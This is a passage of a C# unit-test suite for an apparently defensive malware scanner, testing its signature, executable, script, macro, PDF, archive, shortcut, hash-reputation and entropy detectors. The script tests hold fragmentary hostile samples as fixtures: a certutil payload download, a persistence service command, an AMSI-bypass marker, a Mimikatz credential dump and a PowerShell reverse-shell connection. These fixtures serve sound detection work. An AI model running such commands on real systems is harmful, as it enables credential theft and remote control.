using System.Text;
using Lumen.Core.Detection;
using Lumen.Core.Detection.Pe;
using Lumen.Core.Models;
using Lumen.Core.Scanning;
using Lumen.Core.Util;

namespace Lumen.Core.Tests;

/// <summary>
/// Tests for the extended detection engine. Every fixture is synthetic and built in
/// memory, so nothing here touches a real user folder, a real process or the network.
/// </summary>
public sealed class DetectionExpansionTests
{
    // ---------------------------------------------------------------- signature engine

    [Fact]
    public void Signature_engine_matches_hex_pattern_with_wildcards()
    {
        var engine = EngineFromJson(DetectionFixtures.SignatureRuleFile("test.hex", "hex", "4D 5A ?? 03 00 00 00"));
        var probe = FileProbe.FromBytes("sample.bin", [0x4D, 0x5A, 0x90, 0x03, 0x00, 0x00, 0x00, 0x04]);

        var matches = engine.Match(probe, CancellationToken.None);

        Assert.Single(matches);
        Assert.Equal("test.hex", matches[0].Rule.Id);
        Assert.Equal(0, matches[0].Offset);
    }

    [Fact]
    public void Signature_engine_hex_wildcard_does_not_match_different_bytes()
    {
        var engine = EngineFromJson(DetectionFixtures.SignatureRuleFile("test.hex", "hex", "4D 5A ?? 03 00 00 00"));
        var probe = FileProbe.FromBytes("sample.bin", [0x4D, 0x5A, 0x90, 0x04, 0x00, 0x00, 0x00, 0x04]);

        Assert.Empty(engine.Match(probe, CancellationToken.None));
    }

    [Fact]
    public void Signature_engine_ascii_pattern_ignores_case_by_default()
    {
        var engine = EngineFromJson(DetectionFixtures.SignatureRuleFile("test.ascii", "ascii", "Microsoft"));
        var probe = FileProbe.FromText("sample.txt", "the MICROSOFT contract");

        Assert.Single(engine.Match(probe, CancellationToken.None));
    }

    [Fact]
    public void Signature_engine_ascii_pattern_can_require_exact_case()
    {
        var engine = EngineFromJson(DetectionFixtures.SignatureRuleFile("test.ascii", "ascii", "Microsoft", caseSensitive: true));
        var probe = FileProbe.FromText("sample.txt", "the MICROSOFT contract");

        Assert.Empty(engine.Match(probe, CancellationToken.None));
    }

    [Fact]
    public void Signature_engine_token_group_pattern_requires_every_group()
    {
        var engine = EngineFromJson(DetectionFixtures.SignatureRuleFile("test.tokens", "tokenGroups", "alpha,beta|gamma"));
        var matching = FileProbe.FromText("sample.txt", "alpha and gamma");
        var partial = FileProbe.FromText("sample.txt", "alpha only");

        Assert.Single(engine.Match(matching, CancellationToken.None));
        Assert.Empty(engine.Match(partial, CancellationToken.None));
    }

    [Fact]
    public void Signature_engine_rejects_a_malformed_rule_file_and_reports_the_problem()
    {
        using var temp = new TempDirectory();
        var path = temp.File("rules.json", "{ this is not json");
        var log = new FakeLog();

        var result = SignatureEngine.LoadFromFile(path, log);

        Assert.False(result.Ok);
        Assert.NotNull(result.Problem);
        Assert.Empty(result.RuleSet?.Rules ?? []);
        Assert.Contains(log.Lines, line => line.StartsWith("WARN", StringComparison.Ordinal));
    }

    [Fact]
    public void Signature_engine_rejects_a_rule_file_with_an_unknown_schema_version()
    {
        using var temp = new TempDirectory();
        var path = temp.File("rules.json", DetectionFixtures.SignatureRuleFile("test.hex", "hex", "4D 5A", schemaVersion: 99));

        var result = SignatureEngine.LoadFromFile(path);

        Assert.False(result.Ok);
        Assert.Contains("schema version", result.Problem!, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Signature_engine_rejects_a_rule_file_with_a_malformed_hex_pattern()
    {
        using var temp = new TempDirectory();
        var path = temp.File("rules.json", DetectionFixtures.SignatureRuleFile("test.hex", "hex", "ZZ 5A"));

        var result = SignatureEngine.LoadFromFile(path);

        Assert.False(result.Ok);
        Assert.NotNull(result.Problem);
    }

    [Fact]
    public void Signature_engine_loads_a_rule_from_a_data_file()
    {
        using var temp = new TempDirectory();
        var path = temp.File(
            "rules.json",
            DetectionFixtures.SignatureRuleFile("test.from-disk", "ascii", "LUMEN-TEST-MARKER", extensions: [".txt"]));

        var result = SignatureEngine.LoadFromFile(path);

        Assert.True(result.Ok);
        Assert.Single(result.RuleSet!.Rules);
        Assert.Equal("test.from-disk", result.RuleSet.Rules[0].Id);

        var engine = new SignatureEngine(result.RuleSet);
        var probe = FileProbe.FromText("sample.txt", "a LUMEN-TEST-MARKER inside");
        Assert.Single(engine.Match(probe, CancellationToken.None));
    }

    [Fact]
    public void Signature_engine_keeps_working_when_the_rule_file_on_disk_is_malformed()
    {
        using var temp = new TempDirectory();
        var path = temp.File("rules.json", "not a rule file at all");
        var log = new FakeLog();

        var engine = SignatureEngine.CreateDefault(path, log);

        Assert.False(engine.Load.Ok);
        Assert.NotNull(engine.Load.Problem);
        Assert.NotEmpty(engine.Rules);
        Assert.Contains(log.Lines, line => line.StartsWith("WARN", StringComparison.Ordinal));
    }

    [Fact]
    public void Signature_engine_loads_the_embedded_rule_set()
    {
        var result = SignatureEngine.LoadEmbedded();

        Assert.True(result.Ok);
        Assert.NotEmpty(result.RuleSet!.Rules);
        Assert.All(result.RuleSet.Rules, rule =>
        {
            Assert.False(string.IsNullOrWhiteSpace(rule.Id));
            Assert.False(string.IsNullOrWhiteSpace(rule.Description));
            Assert.False(string.IsNullOrWhiteSpace(rule.Advice));
            Assert.NotEmpty(rule.Patterns);
        });
    }

    [Fact]
    public void Signature_engine_fires_on_a_document_that_holds_an_executable_header()
    {
        var engine = SignatureEngine.CreateEmbedded();
        var probe = FileProbe.FromBytes("invoice.pdf", [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00]);

        var findings = engine.Inspect(probe, CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "sig.pe-header-in-document-file");
    }

    [Fact]
    public void Signature_engine_does_not_fire_on_a_plain_document()
    {
        var engine = SignatureEngine.CreateEmbedded();
        var probe = FileProbe.FromText("invoice.pdf", "%PDF-1.7 nothing to see here");

        Assert.Empty(engine.Inspect(probe, CancellationToken.None));
    }

    // ---------------------------------------------------------------- portable executable

    [Fact]
    public void Pe_parser_reads_the_machine_type_subsystem_and_sections()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Machine = 0x8664,
            Subsystem = 2,
            Sections = [new PeSectionSpec(".text", new byte[256], 0x6000_0020)]
        });

        var parsed = PeParser.TryParse(image, truncated: false, out var header, out var error);

        Assert.True(parsed);
        Assert.Null(error);
        Assert.NotNull(header);
        Assert.Equal("AMD64", header!.MachineName);
        Assert.Equal("Windows graphical", header.SubsystemName);
        Assert.Single(header.Sections);
        Assert.Equal(".text", header.Sections[0].Name);
    }

    [Fact]
    public void Pe_parser_rejects_a_file_that_is_not_an_executable()
    {
        var parsed = PeParser.TryParse(Encoding.ASCII.GetBytes("just some text"), truncated: false, out var header, out var error);

        Assert.False(parsed);
        Assert.Null(header);
        Assert.NotNull(error);
    }

    [Fact]
    public void Pe_detector_reports_a_section_named_after_a_packer()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Sections = [new PeSectionSpec("UPX0", new byte[512], 0xC000_0040)]
        });

        var findings = new PortableExecutableDetector().Inspect(FileProbe.FromBytes("packed.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.packer-section-name");
    }

    [Fact]
    public void Pe_detector_reports_a_section_with_very_high_entropy()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Sections = [new PeSectionSpec(".text", DetectionFixtures.HighEntropyBytes(4096), 0x6000_0020)]
        });

        var findings = new PortableExecutableDetector().Inspect(FileProbe.FromBytes("packed.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.high-entropy-section");
    }

    [Fact]
    public void Pe_detector_reports_notable_api_imports()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread"])]
        });

        var findings = new PortableExecutableDetector().Inspect(FileProbe.FromBytes("tool.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.suspicious-api-import");
    }

    [Fact]
    public void Pe_detector_reports_an_executable_without_a_signature()
    {
        var image = DetectionFixtures.PeImage();

        var findings = new PortableExecutableDetector().Inspect(FileProbe.FromBytes("tool.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.unsigned-executable");
    }

    [Fact]
    public void Pe_detector_reports_a_signature_that_does_not_read_as_valid()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Certificate = [0x10, 0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x01, 0x02, 0x03]
        });

        var findings = new PortableExecutableDetector().Inspect(FileProbe.FromBytes("tool.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.invalid-digital-signature");
    }

    [Fact]
    public void Pe_detector_reports_a_timestamp_that_is_far_in_the_past()
    {
        var clock = new FakeClock { UtcNow = new DateTimeOffset(2026, 1, 1, 12, 0, 0, TimeSpan.Zero) };
        var image = DetectionFixtures.PeImage(new PeImageOptions { Timestamp = 1000 });

        var findings = new PortableExecutableDetector(clock).Inspect(FileProbe.FromBytes("tool.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.timestamp-anomaly");
    }

    [Fact]
    public void Pe_detector_reports_a_timestamp_that_is_in_the_future()
    {
        var clock = new FakeClock { UtcNow = new DateTimeOffset(2026, 1, 1, 12, 0, 0, TimeSpan.Zero) };
        var image = DetectionFixtures.PeImage(new PeImageOptions { Timestamp = 1_900_000_000 });

        var findings = new PortableExecutableDetector(clock).Inspect(FileProbe.FromBytes("tool.exe", image), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pe.timestamp-anomaly");
    }

    [Fact]
    public void Pe_detector_stays_quiet_for_an_ordinary_signed_executable()
    {
        var image = DetectionFixtures.PeImage(new PeImageOptions
        {
            Sections = [new PeSectionSpec(".text", new byte[512], 0x6000_0020)],
            Imports = [new PeImportSpec("KERNEL32.dll", ["CreateFileA", "ReadFile", "ExitProcess"])],
            Certificate = ValidCertificate()
        });

        var findings = new PortableExecutableDetector().Inspect(FileProbe.FromBytes("tool.exe", image), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    [Fact]
    public void Pe_detector_stays_quiet_for_a_file_that_is_not_an_executable()
    {
        var findings = new PortableExecutableDetector()
            .Inspect(FileProbe.FromText("notes.txt", "a plain text file that is not an executable"), CancellationToken.None);

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- script heuristics

    [Fact]
    public void Script_detector_reports_a_living_off_the_land_downloader()
    {
        var sample = "certutil -urlcache -split -f https://example.invalid/payload.bin";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("fetch.cmd", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.lolbin-download");
    }

    [Fact]
    public void Script_detector_reports_a_persistence_command()
    {
        var sample = "New-Service -Name \"Updater\" -DisplayName \"Updater\" -BinaryPathName \"C:\\Temp\\upd.exe\"";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("install.ps1", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.persistence");
    }

    [Fact]
    public void Script_detector_reports_obfuscated_script_content()
    {
        var sample = "$cmd = ('I'+'n'+'v'+'o'+'k'+'e'+'-'+'E'+'x'+'e')";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("run.ps1", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.powershell-obfuscation");
    }

    [Fact]
    public void Script_detector_reports_an_antimalware_interface_marker()
    {
        var sample = "if (-not ([System.Management.Automation.PSTypeName]'AmsiInitFailed').Type) { }";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("run.ps1", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.amsi-bypass");
    }

    [Fact]
    public void Script_detector_reports_credential_theft()
    {
        var sample = "Invoke-Mimikatz -dump";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("run.ps1", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.credential-theft");
    }

    [Fact]
    public void Script_detector_reports_a_reverse_shell()
    {
        var sample = "$c = New-Object Net.Sockets.TCPClient('10.0.0.1',4444); $c.Connect('10.0.0.1',4444)";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("run.ps1", sample), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "script.reverse-shell");
    }

    [Fact]
    public void Script_detector_stays_quiet_for_an_ordinary_script()
    {
        var sample = "Write-Output 'hello'; Get-ChildItem -Path C:\\Logs | Select-Object Name";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("maintenance.ps1", sample), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    [Fact]
    public void Script_detector_ignores_files_that_are_not_script_like()
    {
        var sample = "New-Service -Name \"Updater\" -DisplayName \"Updater\"";

        var findings = new ScriptThreatDetector().Inspect(FileProbe.FromText("notes.png", sample), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- office documents

    [Fact]
    public void Office_detector_reports_a_legacy_document_with_macro_markers()
    {
        var payload = Encoding.ASCII.GetBytes("vbaProject.bin AutoOpen Sub Workbook_Open()");
        var document = DetectionFixtures.OleCompoundFile(payload);

        var findings = new OfficeMacroDetector().Inspect(FileProbe.FromBytes("invoice.doc", document), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.vba-macro-project");
        Assert.Contains(findings, finding => finding.RuleId == "office.macro-auto-execution");
    }

    [Fact]
    public void Office_detector_reports_an_open_xml_document_with_a_macro_project()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec("word/vbaProject.bin", Encoding.ASCII.GetBytes("Attribute VB_Name = \"Module1\"\nSub AutoOpen()\nEnd Sub")));

        var findings = new OfficeMacroDetector().Inspect(FileProbe.FromBytes("invoice.docx", document), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.vba-macro-project");
        Assert.Contains(findings, finding => finding.RuleId == "office.macro-auto-execution");
    }

    [Fact]
    public void Office_detector_reports_a_macro_enabled_file_name()
    {
        var findings = new OfficeMacroDetector()
            .Inspect(FileProbe.FromText("invoice.docm", "plain content"), CancellationToken.None)
            .ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "office.macro-enabled-extension");
    }

    [Fact]
    public void Office_detector_stays_quiet_for_a_document_without_macros()
    {
        var document = DetectionFixtures.Zip(
            new ZipEntrySpec("[Content_Types].xml", Encoding.UTF8.GetBytes("<Types/>")),
            new ZipEntrySpec("word/document.xml", Encoding.UTF8.GetBytes("<document>hello</document>")));

        var findings = new OfficeMacroDetector().Inspect(FileProbe.FromBytes("invoice.docx", document), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- pdf documents

    [Fact]
    public void Pdf_detector_reports_embedded_javascript()
    {
        var document = DetectionFixtures.Pdf("2 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert\\(1\\);) >>\nendobj");

        var findings = new PdfDetector().Inspect(FileProbe.FromBytes("form.pdf", document), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pdf.embedded-javascript");
    }

    [Fact]
    public void Pdf_detector_reports_a_launch_action()
    {
        var document = DetectionFixtures.Pdf("3 0 obj\n<< /Type /Action /S /Launch /F (setup.exe) >>\nendobj");

        var findings = new PdfDetector().Inspect(FileProbe.FromBytes("form.pdf", document), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pdf.launch-action");
    }

    [Fact]
    public void Pdf_detector_reports_an_embedded_executable()
    {
        var body = "4 0 obj\n<< /Type /EmbeddedFile >>\nstream\r\nMZ\x90\x00\x03\x00\x00\x00endstream\nendobj";
        var document = DetectionFixtures.Pdf(body);

        var findings = new PdfDetector().Inspect(FileProbe.FromBytes("form.pdf", document), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pdf.embedded-executable");
    }

    [Fact]
    public void Pdf_detector_reports_a_link_to_a_script_scheme()
    {
        var document = DetectionFixtures.Pdf("5 0 obj\n<< /Type /Action /S /URI /URI (javascript:app.alert\\(1\\)) >>\nendobj");

        var findings = new PdfDetector().Inspect(FileProbe.FromBytes("form.pdf", document), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "pdf.script-uri-action");
    }

    [Fact]
    public void Pdf_detector_stays_quiet_for_an_ordinary_document()
    {
        var document = DetectionFixtures.Pdf("2 0 obj\n<< /Type /Page >>\nendobj");

        var findings = new PdfDetector().Inspect(FileProbe.FromBytes("report.pdf", document), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- archives

    [Fact]
    public void Archive_detector_reports_an_executable_inside_the_container()
    {
        var archive = DetectionFixtures.Zip(
            new ZipEntrySpec("readme.txt", Encoding.UTF8.GetBytes("hello")),
            new ZipEntrySpec("setup.exe", new byte[] { 0x4D, 0x5A, 0x90, 0x00 }));

        var findings = new ArchiveDetector().Inspect(FileProbe.FromBytes("bundle.zip", archive), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "archive.executable-inside");
    }

    [Fact]
    public void Archive_detector_reports_an_archive_inside_an_archive()
    {
        var inner = DetectionFixtures.Zip(new ZipEntrySpec("deep.txt", Encoding.UTF8.GetBytes("hello")));
        var archive = DetectionFixtures.Zip(new ZipEntrySpec("inner.zip", inner));

        var findings = new ArchiveDetector().Inspect(FileProbe.FromBytes("bundle.zip", archive), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "archive.nested-archive");
    }

    [Fact]
    public void Archive_detector_reports_a_password_protected_container()
    {
        var archive = DetectionFixtures.Zip(
            new ZipEntrySpec("secret.txt", Encoding.UTF8.GetBytes("hello"), Encrypted: true));

        var findings = new ArchiveDetector().Inspect(FileProbe.FromBytes("bundle.zip", archive), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "archive.password-protected");
    }

    [Fact]
    public void Archive_detector_reports_an_archive_that_is_named_as_a_document()
    {
        var archive = DetectionFixtures.Zip(new ZipEntrySpec("readme.txt", Encoding.UTF8.GetBytes("hello")));

        var findings = new ArchiveDetector().Inspect(FileProbe.FromBytes("invoice.pdf", archive), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "archive.magic-in-document-extension");
    }

    [Fact]
    public void Archive_detector_stays_quiet_for_a_container_with_only_text()
    {
        var archive = DetectionFixtures.Zip(
            new ZipEntrySpec("readme.txt", Encoding.UTF8.GetBytes("hello")),
            new ZipEntrySpec("notes/second.txt", Encoding.UTF8.GetBytes("world")));

        var findings = new ArchiveDetector().Inspect(FileProbe.FromBytes("bundle.zip", archive), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- shortcuts

    [Fact]
    public void Shortcut_detector_reports_a_target_that_runs_a_script_interpreter()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Windows\System32\wscript.exe", @"C:\Temp\drop.vbs");

        var findings = new ShortcutDetector().Inspect(FileProbe.FromBytes("run.lnk", shortcut), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "shortcut.script-target");
    }

    [Fact]
    public void Shortcut_detector_reports_a_target_in_a_temporary_folder()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Users\test\AppData\Local\Temp\drop.exe");

        var findings = new ShortcutDetector().Inspect(FileProbe.FromBytes("run.lnk", shortcut), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "shortcut.temp-path-target");
    }

    [Fact]
    public void Shortcut_detector_reports_a_target_that_is_not_there()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Users\test\AppData\Local\Temp\drop.exe");
        var detector = new ShortcutDetector(new FixedShortcutResolver(exists: false));

        var findings = detector.Inspect(FileProbe.FromBytes("run.lnk", shortcut), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "shortcut.dangling-target");
    }

    [Fact]
    public void Shortcut_detector_does_not_guess_that_a_target_is_missing()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Users\test\AppData\Local\Temp\drop.exe");

        var findings = new ShortcutDetector().Inspect(FileProbe.FromBytes("run.lnk", shortcut), CancellationToken.None).ToArray();

        Assert.DoesNotContain(findings, finding => finding.RuleId == "shortcut.dangling-target");
    }

    [Fact]
    public void Shortcut_detector_stays_quiet_for_an_ordinary_shortcut()
    {
        var shortcut = DetectionFixtures.Shortcut(@"C:\Program Files\Notepad\notepad.exe");

        var findings = new ShortcutDetector().Inspect(FileProbe.FromBytes("notes.lnk", shortcut), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    [Fact]
    public void Shortcut_detector_reads_an_internet_shortcut_file()
    {
        var text = DetectionFixtures.UrlShortcut("file:///C:/Windows/System32/mshta.exe");

        var findings = new ShortcutDetector().Inspect(FileProbe.FromText("run.url", text), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "shortcut.script-target");
    }

    // ---------------------------------------------------------------- risk scoring

    [Fact]
    public void Risk_scorer_score_is_the_sum_of_the_weights()
    {
        var findings = new[]
        {
            Finding("script.reverse-shell", "Reverse shell"),
            Finding("script.amsi-bypass", "Antimalware interface")
        };

        var assessment = new RiskScorer().Evaluate(findings);

        var expected = RiskWeights.For("script.reverse-shell") + RiskWeights.For("script.amsi-bypass");
        Assert.Equal(expected, assessment.Score);
    }

    [Fact]
    public void Risk_scorer_breakdown_lists_every_contributor()
    {
        var findings = new[]
        {
            Finding("script.reverse-shell", "Reverse shell"),
            Finding("script.amsi-bypass", "Antimalware interface")
        };

        var assessment = new RiskScorer().Evaluate(findings);
        var detail = assessment.BuildDetail();

        Assert.Equal(2, assessment.Signals.Count);
        Assert.Contains("script.reverse-shell", detail, StringComparison.Ordinal);
        Assert.Contains("script.amsi-bypass", detail, StringComparison.Ordinal);
        Assert.Contains(RiskWeights.For("script.reverse-shell").ToString(), detail, StringComparison.Ordinal);
    }

    [Fact]
    public void Risk_scorer_counts_a_rule_only_once()
    {
        var findings = new[]
        {
            Finding("script.reverse-shell", "Reverse shell"),
            Finding("script.reverse-shell", "Reverse shell again")
        };

        var assessment = new RiskScorer().Evaluate(findings);

        Assert.Single(assessment.Signals);
        Assert.Equal(RiskWeights.For("script.reverse-shell"), assessment.Score);
    }

    [Fact]
    public void Risk_scorer_builds_a_finding_that_carries_the_breakdown()
    {
        var findings = new[] { Finding("pe.suspicious-api-import", "Notable imports") };

        var scorer = new RiskScorer();
        var assessment = scorer.Evaluate(findings);
        var finding = scorer.BuildFinding(assessment);

        Assert.Equal("risk.aggregate", finding.RuleId);
        Assert.Contains("pe.suspicious-api-import", finding.Detail, StringComparison.Ordinal);
        Assert.Equal(RiskWeights.For("pe.suspicious-api-import"), assessment.Score);
    }

    // ---------------------------------------------------------------- local reputation

    [Fact]
    public void Reputation_detector_reports_a_hash_that_is_on_the_list()
    {
        var content = Encoding.UTF8.GetBytes("a file that is on the local list");
        var hash = HashUtil.Sha256Bytes(content);
        var detector = new HashReputationDetector(HashReputationList.FromEntries(
        [
            new ReputationEntry(hash, "Listed file")
        ]));

        var findings = detector.Inspect(FileProbe.FromBytes("listed.txt", content), CancellationToken.None).ToArray();

        Assert.Single(findings);
        Assert.Equal("reputation.known-bad-hash", findings[0].RuleId);
        Assert.Equal(FindingCategory.Reputation, findings[0].Category);
    }

    [Fact]
    public void Reputation_detector_stays_quiet_for_a_hash_that_is_not_on_the_list()
    {
        var content = Encoding.UTF8.GetBytes("a file that nobody has listed");
        var detector = new HashReputationDetector(HashReputationList.FromEntries(
        [
            new ReputationEntry(new string('a', 64), "Listed file")
        ]));

        Assert.Empty(detector.Inspect(FileProbe.FromBytes("plain.txt", content), CancellationToken.None));
    }

    [Fact]
    public void Reputation_list_rejects_a_malformed_file_and_trusts_nothing()
    {
        using var temp = new TempDirectory();
        var path = temp.File("reputation.json", "{ not json");

        var result = HashReputationList.LoadFromFile(path);

        Assert.False(result.Ok);
        Assert.NotNull(result.Problem);
        Assert.Empty(result.Entries);
    }

    [Fact]
    public void Reputation_list_rejects_a_file_with_an_invalid_hash()
    {
        using var temp = new TempDirectory();
        var path = temp.File(
            "reputation.json",
            "{\"schemaVersion\":1,\"entries\":[{\"sha256\":\"not-a-hash\",\"label\":\"broken\"}]}");

        var result = HashReputationList.LoadFromFile(path);

        Assert.False(result.Ok);
        Assert.Empty(result.Entries);
    }

    [Fact]
    public void Reputation_list_loads_a_file_the_user_wrote()
    {
        using var temp = new TempDirectory();
        var path = temp.File(
            "reputation.json",
            "{\"schemaVersion\":1,\"entries\":[{\"sha256\":\"" + new string('b', 64) + "\",\"label\":\"My own entry\"}]}");

        var result = HashReputationList.LoadFromFile(path);

        Assert.True(result.Ok);
        Assert.Single(result.Entries);
        Assert.Equal("My own entry", result.Entries[new string('b', 64)].Label);
    }

    [Fact]
    public void Reputation_detector_reports_the_eicar_test_file_by_hash()
    {
        var detector = new HashReputationDetector(HashReputationList.CreateDefault());

        var findings = detector.Inspect(FileProbe.FromBytes("eicar.com", TestData.EicarBytes()), CancellationToken.None).ToArray();

        Assert.Single(findings);
        Assert.Equal("test.eicar-hash", findings[0].RuleId);
        Assert.Equal(FindingCategory.TestSignature, findings[0].Category);
    }

    [Fact]
    public void Built_in_reputation_hash_matches_the_eicar_test_file()
    {
        Assert.Equal(HashReputationList.EicarSha256, HashUtil.Sha256Bytes(TestData.EicarBytes()));
    }

    [Fact]
    public void Reputation_detector_stays_quiet_when_only_a_prefix_of_the_file_was_read()
    {
        var content = TestData.EicarBytes();
        var detector = new HashReputationDetector(HashReputationList.CreateDefault());
        var probe = new FileProbe("eicar.com", content.Length + 100, FileAttributes.Normal, content, contentTruncated: true);

        Assert.Empty(detector.Inspect(probe, CancellationToken.None));
    }

    // ---------------------------------------------------------------- entropy

    [Fact]
    public void Entropy_detector_reports_a_file_whose_bytes_are_almost_evenly_spread()
    {
        var content = DetectionFixtures.HighEntropyBytes(8192);

        var findings = new EntropyDetector().Inspect(FileProbe.FromBytes("blob.bin", content), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "entropy.high-entropy-file");
    }

    [Fact]
    public void Entropy_detector_reports_a_packed_block_at_the_end_of_a_text_file()
    {
        var text = string.Concat(Enumerable.Repeat("this is an ordinary line of text in a file. ", 120));
        var content = DetectionFixtures.TextWithBinaryTail(text, 4096);

        var findings = new EntropyDetector().Inspect(FileProbe.FromBytes("notes.txt", content), CancellationToken.None).ToArray();

        Assert.Contains(findings, finding => finding.RuleId == "entropy.encrypted-tail");
    }

    [Fact]
    public void Entropy_detector_stays_quiet_for_ordinary_text()
    {
        var text = string.Concat(Enumerable.Repeat("this is an ordinary line of text in a file. ", 120));

        var findings = new EntropyDetector().Inspect(FileProbe.FromText("notes.txt", text), CancellationToken.None).ToArray();

        Assert.Empty(findings);
    }

    // ---------------------------------------------------------------- catalogue and registry

    [Fact]
    public void Registry_contains_the_new_detectors()
    {
        var registry = DetectorRegistry.CreateDefault();
        var ids = registry.Detectors.Select(detector => detector.Id).ToArray();

        Assert.Contains("signature.engine", ids);
        Assert.Contains("pe.analysis", ids);
        Assert.Contains("script.threats", ids);
        Assert.Contains("office.macros", ids);
        Assert.Contains("pdf.analysis", ids);
        Assert.Contains("archive.analysis", ids);
        Assert.Contains("shortcut.analysis", ids);
        Assert.Contains("reputation.hashes", ids);
        Assert.Contains("entropy.analysis", ids);
    }

    [Fact]
    public void Catalog_documents_every_new_rule()
    {
        var expected = new[]
        {
            "test.eicar-hash", "reputation.known-bad-hash",
            "sig.pe-header-in-document-file", "sig.upx-packer-marker", "sig.windows-script-host-reference",
            "sig.amsi-bypass-marker", "sig.powershell-stealth-switch", "sig.base64-decode-call",
            "script.lolbin-download", "script.lolbin-script-execution", "script.powershell-obfuscation",
            "script.amsi-bypass", "script.stealth-powershell", "script.persistence", "script.av-tampering",
            "script.credential-theft", "script.reverse-shell",
            "pe.packer-section-name", "pe.high-entropy-section", "pe.suspicious-api-import",
            "pe.unsigned-executable", "pe.invalid-digital-signature", "pe.timestamp-anomaly",
            "office.vba-macro-project", "office.macro-auto-execution", "office.macro-enabled-extension",
            "office.external-template",
            "pdf.embedded-javascript", "pdf.launch-action", "pdf.auto-open-action", "pdf.script-uri-action", "pdf.embedded-executable",
            "archive.executable-inside", "archive.nested-archive", "archive.password-protected",
            "archive.suspicious-compression-ratio", "archive.magic-in-document-extension",
            "shortcut.script-target", "shortcut.temp-path-target", "shortcut.dangling-target",
            "entropy.high-entropy-file", "entropy.encrypted-tail", "risk.aggregate"
        };

        foreach (var id in expected)
        {
            Assert.Contains(DetectionCatalog.Rules, rule => rule.Id == id);
        }
    }

    [Fact]
    public void Catalog_rule_identifiers_are_unique()
    {
        var ids = DetectionCatalog.Rules.Select(rule => rule.Id).ToArray();

        Assert.Equal(ids.Length, ids.Distinct(StringComparer.OrdinalIgnoreCase).Count());
        Assert.All(DetectionCatalog.Rules, rule => Assert.False(string.IsNullOrWhiteSpace(rule.Description)));
    }

    [Fact]
    public void Every_rule_the_detectors_report_is_documented_in_the_catalog()
    {
        var registry = DetectorRegistry.CreateDefault();
        var documented = DetectionCatalog.Rules.Select(rule => rule.Id).ToHashSet(StringComparer.OrdinalIgnoreCase);
        var produced = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var probe in SampleProbes())
        {
